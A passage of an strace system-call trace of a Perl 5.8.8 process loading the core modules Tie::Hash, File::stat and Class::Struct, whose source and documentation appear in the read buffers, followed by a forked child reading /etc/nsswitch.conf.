\".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
6823  07:15:42.858901 stat64("/etc/perl/Tie/Hash.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.858930 stat64("/etc/perl/Tie/Hash.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.858970 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.858997 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.859025 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.859038 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.859052 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.859064 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.859077 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.859088 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.859102 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.859114 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.859128 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.859140 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
6823  07:15:42.859161 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.859176 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.859187 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.859207 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
6823  07:15:42.859586 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
6823  07:15:42.860142 read(8, "", 4096) = 0
6823  07:15:42.860158 close(8)          = 0
6823  07:15:42.860189 stat64("/etc/perl/File/stat.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.860204 stat64("/etc/perl/File/stat.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.860219 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.860231 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.860245 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.860258 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.860272 stat64("/usr/lib/perl5/File/stat.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.860284 stat64("/usr/lib/perl5/File/stat.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.860297 stat64("/usr/share/perl5/File/stat.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.860309 stat64("/usr/share/perl5/File/stat.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.860323 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.860335 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbf80c7bc) = -1 ENOENT (No such file or directory)
6823  07:15:42.860349 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbf80c8ac) = -1 ENOENT (No such file or directory)
6823  07:15:42.860361 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
6823  07:15:42.860383 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
6823  07:15:42.860398 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c5c8) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.860422 _llseek(8, 0, [0], SEEK_CUR) = 0
6823  07:15:42.860468 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
6823  07:15:42.860894 stat64("/etc/perl/Class/Struct.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.860924 stat64("/etc/perl/Class/Struct.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.860963 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.860990 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.861004 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.861017 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.861035 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.861047 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.861061 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.861073 stat64("/usr/share/perl5/Class/Struct.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.861086 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.861099 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbf80c30c) = -1 ENOENT (No such file or directory)
6823  07:15:42.861113 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbf80c3fc) = -1 ENOENT (No such file or directory)
6823  07:15:42.861126 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
6823  07:15:42.861147 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
6823  07:15:42.861162 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c118) = -1 ENOTTY (Inappropriate ioctl for device)
6823  07:15:42.861173 _llseek(10, 0, [0], SEEK_CUR) = 0
6823  07:15:42.861192 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
6823  07:15:42.861657 brk(0x82de000)    = 0x82de000
6823  07:15:42.862042 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
6823  07:15:42.862652 _llseek(10, 6916, [6916], SEEK_SET) = 0
6823  07:15:42.862670 _llseek(10, 0, [6916], SEEK_CUR) = 0
6823  07:15:42.862680 close(10)         = 0
6823  07:15:42.862848 _llseek(8, 1334, [1334], SEEK_SET) = 0
6823  07:15:42.867999 _llseek(8, 0, [1334], SEEK_CUR) = 0
6823  07:15:42.868013 close(8)          = 0
6823  07:15:42.868699 brk(0x82ff000)    = 0x82ff000
6823  07:15:42.868842 _llseek(6, 2689, [2689], SEEK_SET) = 0
6823  07:15:42.868858 _llseek(6, 0, [2689], SEEK_CUR) = 0
6823  07:15:42.868868 close(6)          = 0
6823  07:15:42.869096 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7de3908) = 6824
6824  07:15:42.897497 getppid()         = 6823
6824  07:15:42.897860 open("/etc/nsswitch.conf", O_RDONLY) = 6
6824  07:15:42.897887 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
6824  07:15:42.897907 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa9000
6824  07:15:42.897922 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
6824  07:15:42.897973 read(6, "", 4096) = 0
6824  07:15:42.897984 close(6)          = 0
6824  07:15:42.897994 munmap(0xb7fa9000, 4096) = 0
6824  07:15:42.898022 open("/etc/ld.so.cache", O_RDONLY) = 6
6824  07:15:42.898036 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
6824  07:15:42.898053 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7db0000
6824  07:15:42.898078 close(6)          = 0
